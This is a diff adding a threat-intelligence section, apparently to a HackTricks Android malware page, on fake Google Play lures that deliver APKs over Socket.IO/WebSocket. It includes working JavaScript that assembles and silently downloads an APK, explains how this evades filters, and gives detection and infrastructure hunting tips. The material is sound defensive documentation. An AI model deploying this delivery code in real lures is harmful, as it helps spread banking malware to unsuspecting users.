@@ -222,11 +222,76 @@ public void onMessageReceived(RemoteMessage msg){
 
 ---
 
+## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages
+
+Attackers increasingly replace static APK links with a Socket.IO/WebSocket channel embedded in Google Play–looking lures. This conceals the payload URL, bypasses URL/extension filters, and preserves a realistic install UX.
+
+Typical client flow observed in the wild:
+
+```javascript
+// Open Socket.IO channel and request payload
+const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
+socket.emit("startDownload", { app: "com.example.app" });
+
+// Accumulate binary chunks and drive fake Play progress UI
+const chunks = [];
+socket.on("chunk", (chunk) => chunks.push(chunk));
+socket.on("downloadProgress", (p) => updateProgressBar(p));
+
+// Assemble APK client‑side and trigger browser save dialog
+socket.on("downloadComplete", () => {
+  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
+  a.href = url; a.download = "app.apk"; a.style.display = "none";
+  document.body.appendChild(a); a.click();
+});
+```
+
+Why it evades simple controls:
+- No static APK URL is exposed; payload is reconstructed in memory from WebSocket frames.
+- URL/MIME/extension filters that block direct .apk responses may miss binary data tunneled via WebSockets/Socket.IO.
+- Crawlers and URL sandboxes that don’t execute WebSockets won’t retrieve the payload.
+
+Hunting and detection ideas:
+- Web/network telemetry: flag WebSocket sessions that transfer large binary chunks followed by creation of a Blob with MIME application/vnd.android.package-archive and a programmatic `<a download>` click. Look for client strings like socket.emit('startDownload'), and events named chunk, downloadProgress, downloadComplete in page scripts.
+- Play-store spoof heuristics: on non-Google domains serving Play-like pages, hunt for Google Play UI strings such as http.html:"VfPpkd-jY41G-V67aGc", mixed-language templates, and fake “verification/progress” flows driven by WS events.
+- Controls: block APK delivery from non-Google origins; enforce MIME/extension policies that include WebSocket traffic; preserve browser safe-download prompts.
+
+See also WebSocket tradecraft and tooling:
+
+{{#ref}}
+../../pentesting-web/websocket-attacks.md
+{{#endref}}
+
+### Open-directory APK staging & rotation
+
+Operators often keep multiple bank-themed loaders in browsable indexes for rapid rotation and reuse. This enables:
+- Fast swapping of filenames/brands without code changes in lures.
+- Seed lists for smishing/SEO lures that reference fresh filenames.
+
+Hunting tips:
+- Continuously scrape open indexes for APK filenames + hashes; diff over time to track rotations.
+- Correlate APK families by reused signing certs, package names, hardcoded endpoints, and string kits.
+
+### Infrastructure fingerprints for proactive blocking
+
+Common recurring traits worth risk-scoring when observed together:
+- Hosting: Alibaba, Scloud, Cloudflare fronting; geo often SG/ID; nginx servers.
+- Registrar/NS: Gname.com Pte. Ltd.; nameservers like share-dns[.]net; inexpensive/fast issuance CAs (e.g., R10, R11, WE1).
+- Content: page titles like “Identitas Kependudukan Digital- Apps on Google Play”; short domain-registration→first-DNS resolution deltas (< 12h) indicating quick operationalization.
+
+
+
 ## References
 
 - [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
 - [Luban – Android image compression library](https://github.com/Curzibn/Luban)
 - [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
 - [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
+
+- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
+- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
+- [Socket.IO](https://socket.io)
 
 {{#include ../../banners/hacktricks-training.md}}
